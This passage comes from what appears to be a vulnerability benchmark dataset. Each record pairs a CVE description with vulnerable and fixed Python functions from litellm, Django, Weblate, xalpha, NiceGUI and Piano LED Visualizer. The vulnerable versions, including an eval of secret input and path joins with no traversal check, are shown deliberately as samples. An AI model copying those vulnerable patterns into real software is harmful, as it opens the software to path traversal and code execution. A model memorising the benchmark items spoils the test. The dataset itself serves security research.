KeyManagementSystem.AZURE_KEY_VAULT.value\n                    or type(client).__module__ + \".\" + type(client).__name__\n                    == \"azure.keyvault.secrets._client.SecretClient\"\n                ):  # support Azure Secret Client - from azure.keyvault.secrets import SecretClient\n                    secret = client.get_secret(secret_name).value\n                elif (\n                    key_manager == KeyManagementSystem.GOOGLE_KMS.value\n                    or client.__class__.__name__ == \"KeyManagementServiceClient\"\n                ):\n                    encrypted_secret: Any = os.getenv(secret_name)\n                    if encrypted_secret is None:\n                        raise ValueError(\n                            f\"Google KMS requires the encrypted secret to be in the environment!\"\n                        )\n                    b64_flag = _is_base64(encrypted_secret)\n                    if b64_flag == True:  # if passed in as encoded b64 string\n                        encrypted_secret = base64.b64decode(encrypted_secret)\n                        ciphertext = encrypted_secret\n                    else:\n                        raise ValueError(\n                            f\"Google KMS requires the encrypted secret to be encoded in base64\"\n                        )#fix for this vulnerability https://huntr.com/bounties/ae623c2f-b64b-4245-9ed4-f13a0a5824ce\n                    response = client.decrypt(\n                        request={\n                            \"name\": litellm._google_kms_resource_name,\n                            \"ciphertext\": ciphertext,\n                        }\n                    )\n                    secret = response.plaintext.decode(\n                        \"utf-8\"\n                    )  # assumes the original value was encoded with utf-8\n                elif key_manager == KeyManagementSystem.AWS_KMS.value:\n                    \"\"\"\n                    Only check the tokens which start with 'aws_kms/'. This prevents latency impact caused by checking all keys.\n                    \"\"\"\n                    encrypted_value = os.getenv(secret_name, None)\n                    if encrypted_value is None:\n                        raise Exception(\"encrypted value for AWS KMS cannot be None.\")\n                    # Decode the base64 encoded ciphertext\n                    ciphertext_blob = base64.b64decode(encrypted_value)\n\n                    # Set up the parameters for the decrypt call\n                    params = {\"CiphertextBlob\": ciphertext_blob}\n\n                    # Perform the decryption\n                    response = client.decrypt(**params)\n\n                    # Extract and decode the plaintext\n                    plaintext = response[\"Plaintext\"]\n                    secret = plaintext.decode(\"utf-8\")\n                elif key_manager == KeyManagementSystem.AWS_SECRET_MANAGER.value:\n                    try:\n                        get_secret_value_response = client.get_secret_value(\n                            SecretId=secret_name\n                        )\n                        print_verbose(\n                            f\"get_secret_value_response: {get_secret_value_response}\"\n                        )\n                    except Exception as e:\n                        print_verbose(f\"An error occurred - {str(e)}\")\n                        # For a list of exceptions thrown, see\n                        # https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html\n                        raise e\n\n                    # assume there is 1 secret per secret_name\n                    secret_dict = json.loads(get_secret_value_response[\"SecretString\"])\n                    print_verbose(f\"secret_dict: {secret_dict}\")\n                    for k, v in secret_dict.items():\n                        secret = v\n                    print_verbose(f\"secret: {secret}\")\n                elif key_manager == \"local\":\n                    secret = os.getenv(secret_name)\n                else:  # assume the default is infisicial client\n                    secret = client.get_secret(secret_name).secret_value\n            except Exception as e:  # check if it's in os.environ\n                verbose_logger.error(\n                    f\"An exception occurred - {str(e)}\\n\\n{traceback.format_exc()}\"\n                )\n                secret = os.getenv(secret_name)\n            try:\n                secret_value_as_bool = ast.literal_eval(secret)\n                if isinstance(secret_value_as_bool, bool):\n                    return secret_value_as_bool\n                else:\n                    return secret\n            except:\n                return secret\n        else:\n            secret = os.environ.get(secret_name)\n            try:\n                secret_value_as_bool = (\n                    ast.literal_eval(secret) if secret is not None else None\n                )\n                if isinstance(secret_value_as_bool, bool):\n                    return secret_value_as_bool\n                else:\n                    return secret\n            except:\n                return secret\n    except Exception as e:\n        if default_value is not None:\n            return default_value\n        else:\n            raise e"
      }
    ],
    "vul_patch": "--- a/litellm/utils.py\n+++ b/litellm/utils.py\n@@ -118,14 +118,11 @@\n                     b64_flag = _is_base64(encrypted_secret)\n                     if b64_flag == True:  # if passed in as encoded b64 string\n                         encrypted_secret = base64.b64decode(encrypted_secret)\n-                    if not isinstance(encrypted_secret, bytes):\n-                        # If it's not, assume it's a string and encode it to bytes\n-                        ciphertext = eval(\n-                            encrypted_secret.encode()\n-                        )  # assuming encrypted_secret is something like - b'\\n$\\x00D\\xac\\xb4/t)07\\xe5\\xf6..'\n+                        ciphertext = encrypted_secret\n                     else:\n-                        ciphertext = encrypted_secret\n-\n+                        raise ValueError(\n+                            f\"Google KMS requires the encrypted secret to be encoded in base64\"\n+                        )#fix for this vulnerability https://huntr.com/bounties/ae623c2f-b64b-4245-9ed4-f13a0a5824ce\n                     response = client.decrypt(\n                         request={\n                             \"name\": litellm._google_kms_resource_name,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-33203",
    "cve_description": "Django before 2.2.24, 3.x before 3.1.12, and 3.2.x before 3.2.4 has a potential directory traversal via django.contrib.admindocs. Staff members could use the TemplateDetailView view to check the existence of arbitrary files. Additionally, if (and only if) the default admindocs templates have been customized by application developers to also show file contents, then not only the existence but also the file contents would have been exposed. In other words, there is directory traversal outside of the template root directories.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/20c67a0693c4ede2b09af02574823485e82e4c8f",
      "https://github.com/django/django/commit/dfaba12cda060b8b292ae1d271b44bf810b1c5b9",
      "https://github.com/django/django/commit/053cc9534d174dc89daba36724ed2dcb36755b90"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_6_1",
        "commit": "aa8781c",
        "file_path": "django/contrib/admindocs/views.py",
        "start_line": 321,
        "end_line": 347,
        "snippet": "    def get_context_data(self, **kwargs):\n        template = self.kwargs['template']\n        templates = []\n        try:\n            default_engine = Engine.get_default()\n        except ImproperlyConfigured:\n            # Non-trivial TEMPLATES settings aren't supported (#24125).\n            pass\n        else:\n            # This doesn't account for template loaders (#24128).\n            for index, directory in enumerate(default_engine.dirs):\n                template_file = Path(directory) / template\n                if template_file.exists():\n                    template_contents = template_file.read_text()\n                else:\n                    template_contents = ''\n                templates.append({\n                    'file': template_file,\n                    'exists': template_file.exists(),\n                    'contents': template_contents,\n                    'order': index,\n                })\n        return super().get_context_data(**{\n            **kwargs,\n            'name': template,\n            'templates': templates,\n        })"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_6_1",
        "commit": "20c67a0",
        "file_path": "django/contrib/admindocs/views.py",
        "start_line": 322,
        "end_line": 348,
        "snippet": "    def get_context_data(self, **kwargs):\n        template = self.kwargs['template']\n        templates = []\n        try:\n            default_engine = Engine.get_default()\n        except ImproperlyConfigured:\n            # Non-trivial TEMPLATES settings aren't supported (#24125).\n            pass\n        else:\n            # This doesn't account for template loaders (#24128).\n            for index, directory in enumerate(default_engine.dirs):\n                template_file = Path(safe_join(directory, template))\n                if template_file.exists():\n                    template_contents = template_file.read_text()\n                else:\n                    template_contents = ''\n                templates.append({\n                    'file': template_file,\n                    'exists': template_file.exists(),\n                    'contents': template_contents,\n                    'order': index,\n                })\n        return super().get_context_data(**{\n            **kwargs,\n            'name': template,\n            'templates': templates,\n        })"
      }
    ],
    "vul_patch": "--- a/django/contrib/admindocs/views.py\n+++ b/django/contrib/admindocs/views.py\n@@ -9,7 +9,7 @@\n         else:\n             # This doesn't account for template loaders (#24128).\n             for index, directory in enumerate(default_engine.dirs):\n-                template_file = Path(directory) / template\n+                template_file = Path(safe_join(directory, template))\n                 if template_file.exists():\n                     template_contents = template_file.read_text()\n                 else:\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-33203:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-33203/bin/python ./runtests.py admin_docs.test_views.AdminDocViewDefaultEngineOnly.test_template_detail_path_traversal\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-33203:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-33203/bin/python ./runtests.py admin_docs.test_views\n"
  },
  {
    "cve_id": "CVE-2024-39303",
    "cve_description": "Weblate is a web based localization tool. Prior to version 5.6.2, Weblate didn't correctly validate filenames when restoring project backup. It may be possible to gain unauthorized access to files on the server using a crafted ZIP file. This issue has been addressed in Weblate 5.6.2. As a workaround, do not allow untrusted users to create projects.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/WeblateOrg/weblate",
    "patch_url": [
      "https://github.com/WeblateOrg/weblate/commit/b6a7eace155fa0feaf01b4ac36165a9c5e63bfdd"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_348_1",
        "commit": "0137a35d95c2731b554737bbb1476b90d8118095",
        "file_path": "weblate/trans/backups.py",
        "start_line": 564,
        "end_line": 625,
        "snippet": "    def restore(self, project_name: str, project_slug: str, user, billing=None):\n        if not isinstance(self.filename, str):\n            raise TypeError(\"Need a filename string.\")\n        with ZipFile(self.filename, \"r\") as zipfile:\n            self.load_data(zipfile)\n\n            # Create project\n            kwargs = self.data[\"project\"].copy()\n            kwargs[\"name\"] = project_name\n            kwargs[\"slug\"] = project_slug\n            self.project = project = Project.objects.create(**kwargs)\n\n            # Handle billing and ACL (creating user needs access)\n            self.project.post_create(user, billing)\n\n            # Create labels\n            labels = Label.objects.bulk_create(\n                Label(project=project, **entry) for entry in self.data[\"labels\"]\n            )\n            self.labels_map = {label.name: label for label in labels}\n\n            # Import translation memory\n            memory = self.load_memory(zipfile)\n            Memory.objects.bulk_create(\n                [\n                    Memory(\n                        project=project,\n                        origin=entry[\"origin\"],\n                        source=entry[\"source\"],\n                        target=entry[\"target\"],\n                        source_language=self.import_language(entry[\"source_language\"]),\n                        target_language=self.import_language(entry[\"target_language\"]),\n                    )\n                    for entry in memory\n                ]\n            )\n\n            # Extract VCS\n            for name in zipfile.namelist():\n                if name.startswith(self.VCS_PREFIX):\n                    targetpath = os.path.join(\n                        project.full_path, name[self.VCS_PREFIX_LEN :]\n                    )\n                    upperdirs = os.path.dirname(targetpath)\n                    if upperdirs and not os.path.exists(upperdirs):\n                        os.makedirs(upperdirs)\n                    with zipfile.open(name) as source, open(targetpath, \"wb\") as target:\n                        copyfileobj(source, target)\n\n            # Create components\n            self.load_components(zipfile, self.restore_component)\n\n        # Fixup linked components\n        old_slug = f\"/{self.data['project']['slug']}/\"\n        new_slug = f\"/{project.slug}/\"\n        for component in self.project.component_set.filter(\n            repo__istartswith=\"weblate:\"\n        ):\n            component.repo = component.repo.replace(old_slug, new_slug)\n            component.save()\n\n        return self.project"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_348_1",
        "commit": "b6a7eace155fa0feaf01b4ac36165a9c5e63bfdd",
        "file_path": "weblate/trans/backups.py",
        "start_line": 564,
        "end_line": 627,
        "snippet": "    def restore(self, project_name: str, project_slug: str, user, billing=None):\n        if not isinstance(self.filename, str):\n            raise TypeError(\"Need a filename string.\")\n        with ZipFile(self.filename, \"r\") as zipfile:\n            self.load_data(zipfile)\n\n            # Create project\n            kwargs = self.data[\"project\"].copy()\n            kwargs[\"name\"] = project_name\n            kwargs[\"slug\"] = project_slug\n            self.project = project = Project.objects.create(**kwargs)\n\n            # Handle billing and ACL (creating user needs access)\n            self.project.post_create(user, billing)\n\n            # Create labels\n            labels = Label.objects.bulk_create(\n                Label(project=project, **entry) for entry in self.data[\"labels\"]\n            )\n            self.labels_map = {label.name: label for label in labels}\n\n            # Import translation memory\n            memory = self.load_memory(zipfile)\n            Memory.objects.bulk_create(\n                [\n                    Memory(\n                        project=project,\n                        origin=entry[\"origin\"],\n                        source=entry[\"source\"],\n                        target=entry[\"target\"],\n                        source_language=self.import_language(entry[\"source_language\"]),\n                        target_language=self.import_language(entry[\"target_language\"]),\n                    )\n                    for entry in memory\n                ]\n            )\n\n            # Extract VCS\n            for name in zipfile.namelist():\n                if name.startswith(self.VCS_PREFIX):\n                    path = name[self.VCS_PREFIX_LEN :]\n                    # Skip potentially dangerous paths\n                    if path != os.path.normpath(path):\n                        continue\n                    targetpath = os.path.join(project.full_path, path)\n                    upperdirs = os.path.dirname(targetpath)\n                    if upperdirs and not os.path.exists(upperdirs):\n                        os.makedirs(upperdirs)\n                    with zipfile.open(name) as source, open(targetpath, \"wb\") as target:\n                        copyfileobj(source, target)\n\n            # Create components\n            self.load_components(zipfile, self.restore_component)\n\n        # Fixup linked components\n        old_slug = f\"/{self.data['project']['slug']}/\"\n        new_slug = f\"/{project.slug}/\"\n        for component in self.project.component_set.filter(\n            repo__istartswith=\"weblate:\"\n        ):\n            component.repo = component.repo.replace(old_slug, new_slug)\n            component.save()\n\n        return self.project"
      }
    ],
    "vul_patch": "--- a/weblate/trans/backups.py\n+++ b/weblate/trans/backups.py\n@@ -38,9 +38,11 @@\n             # Extract VCS\n             for name in zipfile.namelist():\n                 if name.startswith(self.VCS_PREFIX):\n-                    targetpath = os.path.join(\n-                        project.full_path, name[self.VCS_PREFIX_LEN :]\n-                    )\n+                    path = name[self.VCS_PREFIX_LEN :]\n+                    # Skip potentially dangerous paths\n+                    if path != os.path.normpath(path):\n+                        continue\n+                    targetpath = os.path.join(project.full_path, path)\n                     upperdirs = os.path.dirname(targetpath)\n                     if upperdirs and not os.path.exists(upperdirs):\n                         os.makedirs(upperdirs)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-37659",
    "cve_description": "xalpha v0.11.4 is vulnerable to Remote Command Execution (RCE).",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/refraction-ray/xalpha",
    "patch_url": [
      "https://github.com/refraction-ray/xalpha/commit/6dceaa159a1a319d750ade20a4595956876657b6"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_94_1",
        "commit": "06a161f",
        "file_path": "xalpha/info.py",
        "start_line": "521",
        "end_line": "568",
        "snippet": "    def __init__(\n        self,\n        code,\n        round_label=0,\n        dividend_label=0,\n        fetch=False,\n        save=False,\n        path=\"\",\n        form=\"csv\",\n        priceonly=False,\n    ):\n        if round_label == 1 or (code in droplist):\n            label = 1  # the scheme of round down on share purchase\n        else:\n            label = 0\n        if code.startswith(\"F\") and code[1:].isdigit():\n            code = code[1:]\n        elif code.startswith(\"M\") and code[1:].isdigit():\n            raise FundTypeError(\n                \"This code seems to be a mfund, use ``mfundinfo`` instead\"\n            )\n        code = code.zfill(6)  # 1234 is the same as 001234\n        self._url = (\n            \"http://fund.eastmoney.com/pingzhongdata/\" + code + \".js\"\n        )  # js url api for info of certain fund\n        self._feeurl = (\n            \"http://fund.eastmoney.com/f10/jjfl_\" + code + \".html\"\n        )  # html url for trade fees info of certain fund\n        self.priceonly = priceonly\n\n        super().__init__(\n            code,\n            fetch=fetch,\n            save=save,\n            path=path,\n            form=form,\n            round_label=label,\n            dividend_label=dividend_label,\n        )\n\n        self.special = self.price[self.price[\"comment\"] != 0]\n        self.specialdate = list(self.special[\"date\"])\n        # date with nonvanishing comment, usually fenhong or zhesuan\n        try:\n            self.fenhongdate = list(self.price[self.price[\"comment\"] > 0][\"date\"])\n            self.zhesuandate = list(self.price[self.price[\"comment\"] < 0][\"date\"])\n        except TypeError:\n            print(\"There are still string comments for the fund!\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_94_1",
        "commit": "6dceaa1",
        "file_path": "xalpha/info.py",
        "start_line": "521",
        "end_line": "570",
        "snippet": "    def __init__(\n        self,\n        code,\n        round_label=0,\n        dividend_label=0,\n        fetch=False,\n        save=False,\n        path=\"\",\n        form=\"csv\",\n        priceonly=False,\n    ):\n        if round_label == 1 or (code in droplist):\n            label = 1  # the scheme of round down on share purchase\n        else:\n            label = 0\n        if code.startswith(\"F\") and code[1:].isdigit():\n            code = code[1:]\n        elif code.startswith(\"M\") and code[1:].isdigit():\n            raise FundTypeError(\n                \"This code seems to be a mfund, use ``mfundinfo`` instead\"\n            )\n        code = code.zfill(6)  # 1234 is the same as 001234\n        assert code.isdigit(), \"fund code must be a strin of six digits\"\n        assert len(code) == 6, \"fund code must be a strin of six digits\"\n        self._url = (\n            \"http://fund.eastmoney.com/pingzhongdata/\" + code + \".js\"\n        )  # js url api for info of certain fund\n        self._feeurl = (\n            \"http://fund.eastmoney.com/f10/jjfl_\" + code + \".html\"\n        )  # html url for trade fees info of certain fund\n        self.priceonly = priceonly\n\n        super().__init__(\n            code,\n            fetch=fetch,\n            save=save,\n            path=path,\n            form=form,\n            round_label=label,\n            dividend_label=dividend_label,\n        )\n\n        self.special = self.price[self.price[\"comment\"] != 0]\n        self.specialdate = list(self.special[\"date\"])\n        # date with nonvanishing comment, usually fenhong or zhesuan\n        try:\n            self.fenhongdate = list(self.price[self.price[\"comment\"] > 0][\"date\"])\n            self.zhesuandate = list(self.price[self.price[\"comment\"] < 0][\"date\"])\n        except TypeError:\n            print(\"There are still string comments for the fund!\")"
      }
    ],
    "vul_patch": "--- a/xalpha/info.py\n+++ b/xalpha/info.py\n@@ -20,6 +20,8 @@\n                 \"This code seems to be a mfund, use ``mfundinfo`` instead\"\n             )\n         code = code.zfill(6)  # 1234 is the same as 001234\n+        assert code.isdigit(), \"fund code must be a strin of six digits\"\n+        assert len(code) == 6, \"fund code must be a strin of six digits\"\n         self._url = (\n             \"http://fund.eastmoney.com/pingzhongdata/\" + code + \".js\"\n         )  # js url api for info of certain fund\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-32005",
    "cve_description": "NiceGUI is an easy-to-use, Python-based UI framework. A local file inclusion is present in the NiceUI leaflet component when requesting resource files under the `/_nicegui/{__version__}/resources/{key}/{path:path}` route. As a result any file on the backend filesystem which the web server has access to can be read by an attacker with access to the NiceUI leaflet website. This vulnerability has been addressed in version 1.4.21. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/zauberzeug/nicegui",
    "patch_url": [
      "https://github.com/zauberzeug/nicegui/commit/ed12eb14f2a6c48b388a05c04b3c5a107ea9d330"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_123_1",
        "commit": "7c3e01a",
        "file_path": "nicegui/nicegui.py",
        "start_line": 96,
        "end_line": 103,
        "snippet": "def _get_resource(key: str, path: str) -> FileResponse:\n    if key in resources:\n        filepath = resources[key].path / path\n        if filepath.exists():\n            headers = {'Cache-Control': 'public, max-age=3600'}\n            media_type, _ = mimetypes.guess_type(filepath)\n            return FileResponse(filepath, media_type=media_type, headers=headers)\n    raise HTTPException(status_code=404, detail=f'resource \"{key}\" not found')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_123_1",
        "commit": "ed12eb1",
        "file_path": "nicegui/nicegui.py",
        "start_line": 96,
        "end_line": 107,
        "snippet": "def _get_resource(key: str, path: str) -> FileResponse:\n    if key in resources:\n        filepath = resources[key].path / path\n        try:\n            filepath.resolve().relative_to(resources[key].path.resolve())  # NOTE: use is_relative_to() in Python 3.9\n        except ValueError as e:\n            raise HTTPException(status_code=403, detail='forbidden') from e\n        if filepath.exists():\n            headers = {'Cache-Control': 'public, max-age=3600'}\n            media_type, _ = mimetypes.guess_type(filepath)\n            return FileResponse(filepath, media_type=media_type, headers=headers)\n    raise HTTPException(status_code=404, detail=f'resource \"{key}\" not found')"
      }
    ],
    "vul_patch": "--- a/nicegui/nicegui.py\n+++ b/nicegui/nicegui.py\n@@ -1,6 +1,10 @@\n def _get_resource(key: str, path: str) -> FileResponse:\n     if key in resources:\n         filepath = resources[key].path / path\n+        try:\n+            filepath.resolve().relative_to(resources[key].path.resolve())  # NOTE: use is_relative_to() in Python 3.9\n+        except ValueError as e:\n+            raise HTTPException(status_code=403, detail='forbidden') from e\n         if filepath.exists():\n             headers = {'Cache-Control': 'public, max-age=3600'}\n             media_type, _ = mimetypes.guess_type(filepath)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-24900",
    "cve_description": "Piano LED Visualizer is software that allows LED lights to light up as a person plays a piano connected to a computer. Version 1.3 and prior are vulnerable to a path traversal attack. The `os.path.join` call is unsafe for use with untrusted input. When the `os.path.join` call encounters an absolute path, it ignores all the parameters it has encountered till that point and starts working with the new absolute path. Since the \"malicious\" parameter represents an absolute path, the result of `os.path.join` ignores the static directory completely. Hence, untrusted input is passed via the `os.path.join` call to `flask.send_file` can lead to path traversal attacks. A patch with a fix is available on the `master` branch of the GitHub repository. This can also be fixed by preventing flow of untrusted data to the vulnerable `send_file` function. In case the application logic necessiates this behaviour, one can either use the `flask.safe_join` to join untrusted paths or replace `flask.send_file` calls with `flask.send_from_directory` calls.",
    "cwe_info": {
      "CWE-668": {
        "name": "Exposure of Resource to Wrong Sphere",
        "description": "The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource."
      }
    },
    "repo": "https://github.com/onlaj/Piano-LED-Visualizer",
    "patch_url": [
      "https://github.com/onlaj/Piano-LED-Visualizer/commit/3f10602323cd8184e1c69a76b815655597bf0ee5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_105_1",
        "commit": "6a732ca",
        "file_path": "webinterface/views_api.py",
        "start_line": "145",
        "end_line": "1114",
        "snippet": "def change_setting():\n    setting_name = request.args.get('setting_name')\n    value = request.args.get('value')\n    second_value = request.args.get('second_value')\n    disable_sequence = request.args.get('disable_sequence')\n\n    reload_sequence = True\n    if (second_value == \"no_reload\"):\n        reload_sequence = False\n\n    if (disable_sequence == \"true\"):\n        webinterface.ledsettings.__init__(webinterface.usersettings)\n        webinterface.ledsettings.sequence_active = False\n\n    if setting_name == \"clean_ledstrip\":\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n    if setting_name == \"led_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n\n        webinterface.ledsettings.color_mode = \"Single\"\n\n        webinterface.ledsettings.red = rgb[0]\n        webinterface.ledsettings.green = rgb[1]\n        webinterface.ledsettings.blue = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"color_mode\", webinterface.ledsettings.color_mode)\n        webinterface.usersettings.change_setting_value(\"red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"blue\", rgb[2])\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"light_mode\":\n        webinterface.ledsettings.mode = value\n        webinterface.usersettings.change_setting_value(\"mode\", value)\n\n    if setting_name == \"fading_speed\" or setting_name == \"velocity_speed\":\n        webinterface.ledsettings.fadingspeed = int(value)\n        webinterface.usersettings.change_setting_value(\"fadingspeed\", webinterface.ledsettings.fadingspeed)\n\n    if setting_name == \"brightness\":\n        webinterface.usersettings.change_setting_value(\"brightness_percent\", int(value))\n        webinterface.ledstrip.change_brightness(int(value), True)\n\n    if setting_name == \"backlight_brightness\":\n        webinterface.ledsettings.backlight_brightness_percent = int(value)\n        webinterface.ledsettings.backlight_brightness = 255 * webinterface.ledsettings.backlight_brightness_percent / 100\n        webinterface.usersettings.change_setting_value(\"backlight_brightness\",\n                                                       int(webinterface.ledsettings.backlight_brightness))\n        webinterface.usersettings.change_setting_value(\"backlight_brightness_percent\",\n                                                       webinterface.ledsettings.backlight_brightness_percent)\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n    if setting_name == \"backlight_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n\n        webinterface.ledsettings.backlight_red = rgb[0]\n        webinterface.ledsettings.backlight_green = rgb[1]\n        webinterface.ledsettings.backlight_blue = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"backlight_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"backlight_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"backlight_blue\", rgb[2])\n\n        fastColorWipe(webinterface.ledstrip.strip, True, webinterface.ledsettings)\n\n    if setting_name == \"sides_color\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n\n        webinterface.ledsettings.adjacent_red = rgb[0]\n        webinterface.ledsettings.adjacent_green = rgb[1]\n        webinterface.ledsettings.adjacent_blue = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"adjacent_red\", rgb[0])\n        webinterface.usersettings.change_setting_value(\"adjacent_green\", rgb[1])\n        webinterface.usersettings.change_setting_value(\"adjacent_blue\", rgb[2])\n\n    if setting_name == \"sides_color_mode\":\n        webinterface.ledsettings.adjacent_mode = value\n        webinterface.usersettings.change_setting_value(\"adjacent_mode\", value)\n\n    if setting_name == \"input_port\":\n        webinterface.usersettings.change_setting_value(\"input_port\", value)\n        webinterface.midiports.change_port(\"inport\", value)\n\n    if setting_name == \"secondary_input_port\":\n        webinterface.usersettings.change_setting_value(\"secondary_input_port\", value)\n\n    if setting_name == \"play_port\":\n        webinterface.usersettings.change_setting_value(\"play_port\", value)\n        webinterface.midiports.change_port(\"playport\", value)\n\n    if setting_name == \"skipped_notes\":\n        webinterface.usersettings.change_setting_value(\"skipped_notes\", value)\n        webinterface.ledsettings.skipped_notes = value\n\n    if setting_name == \"add_note_offset\":\n        webinterface.ledsettings.add_note_offset()\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"append_note_offset\":\n        webinterface.ledsettings.append_note_offset()\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"remove_note_offset\":\n        webinterface.ledsettings.del_note_offset(int(value) + 1)\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"note_offsets\":\n        webinterface.usersettings.change_setting_value(\"note_offsets\", value)\n\n    if setting_name == \"update_note_offset\":\n        webinterface.ledsettings.update_note_offset(int(value) + 1, second_value)\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"led_count\":\n        webinterface.usersettings.change_setting_value(\"led_count\", int(value))\n        webinterface.ledstrip.change_led_count(int(value), True)\n\n    if setting_name == \"shift\":\n        webinterface.usersettings.change_setting_value(\"shift\", int(value))\n        webinterface.ledstrip.change_shift(int(value), True)\n\n    if setting_name == \"reverse\":\n        webinterface.usersettings.change_setting_value(\"reverse\", int(value))\n        webinterface.ledstrip.change_reverse(int(value), True)\n\n    if setting_name == \"color_mode\":\n        reload_sequence = True\n        if (second_value == \"no_reload\"):\n            reload_sequence = False\n\n        webinterface.ledsettings.color_mode = value\n        webinterface.usersettings.change_setting_value(\"color_mode\", webinterface.ledsettings.color_mode)\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == \"add_multicolor\":\n        webinterface.ledsettings.addcolor()\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"add_multicolor_and_set_value\":\n        settings = json.loads(value)\n\n        webinterface.ledsettings.multicolor.clear()\n        webinterface.ledsettings.multicolor_range.clear()\n\n        for key, value in settings.items():\n            rgb = wc.hex_to_rgb(\"#\" + value[\"color\"])\n\n            webinterface.ledsettings.multicolor.append([int(rgb[0]), int(rgb[1]), int(rgb[2])])\n            webinterface.ledsettings.multicolor_range.append([int(value[\"range\"][0]), int(value[\"range\"][1])])\n\n        webinterface.usersettings.change_setting_value(\"multicolor\", webinterface.ledsettings.multicolor)\n        webinterface.usersettings.change_setting_value(\"multicolor_range\",\n                                                       webinterface.ledsettings.multicolor_range)\n\n        return jsonify(success=True)\n\n    if setting_name == \"remove_multicolor\":\n        webinterface.ledsettings.deletecolor(int(value) + 1)\n        return jsonify(success=True, reload=True)\n\n    if setting_name == \"multicolor\":\n        rgb = wc.hex_to_rgb(\"#\" + value)\n        webinterface.ledsettings.multicolor[int(second_value)][0] = rgb[0]\n        webinterface.ledsettings.multicolor[int(second_value)][1] = rgb[1]\n        webinterface.ledsettings.multicolor[int(second_value)][2] = rgb[2]\n\n        webinterface.usersettings.change_setting_value(\"multicolor\", webinterface.ledsettings.multicolor)\n\n        return jsonify(success=True, reload_sequence=reload_sequence)\n\n    if setting_name == 